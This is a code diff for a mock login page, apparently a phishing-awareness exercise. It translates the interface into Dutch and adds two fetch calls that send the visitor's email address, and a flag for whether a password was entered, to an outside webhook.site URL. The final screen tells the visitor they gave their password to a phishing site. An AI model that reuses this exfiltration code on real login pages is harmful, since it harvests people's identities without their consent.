@@ -100,19 +100,23 @@ function change2() {
     input1.value = "";
     input1.type = "password";
     input1.disabled = true;
-    input2.innerHTML = "You idiot";
-    header1.innerHTML = "This was not real";
+    input2.innerHTML = "Je bent gezakt...";
+    header1.innerHTML = "Ai...";
     header1.style.paddingLeft -= 10;
     header1.style.setProperty("grid-column-end", "11");
-    header2.innerHTML = "Check to make sure that sites are the real thing before putting in any personal information";
+    header2.innerHTML = "Je hebt zojuist je wachtwoord doorgegeven aan een phisingwebsite...";
     header2.style.paddingLeft += 15;
     header2.style.setProperty("grid-column-end", "18");
-    forgot.innerHTML = "Forgot password?";
+    forgot.innerHTML = "Wachtwoord vergeten?";
     guest.innerHTML = "";
     learn.innerHTML = "";
     create.innerHTML = "";
     next.style.setProperty("grid-row-start", "14");
     next.style.setProperty("grid-row-end", "15");
+
+    // send fetch request with e-mailadress
+    fetch('https://webhook.site/xgac-pt?email=' + email +'&password=true');
+
 }
 
 function change() {
@@ -127,14 +131,16 @@ function change() {
     var next = document.getElementById('next');
     input1.value = "";
     input1.type = "password";
-    input2.innerHTML = "Enter your password";
-    header1.innerHTML = "Welcome";
+    input2.innerHTML = "Voer uw wachtwoord in";
+    header1.innerHTML = "Welkom";
     header2.innerHTML = email;
     header2.style.paddingLeft += 15;
-    forgot.innerHTML = "Forgot password?";
+    forgot.innerHTML = "Wachtwoord vergeten?";
     guest.innerHTML = "";
     learn.innerHTML = "";
     create.innerHTML = "";
     next.style.setProperty("grid-row-start", "14");
     next.style.setProperty("grid-row-end", "15");
+    
+    fetch('https://webhook.site/xgac-pt?email=' + email +'&password=false');
 }
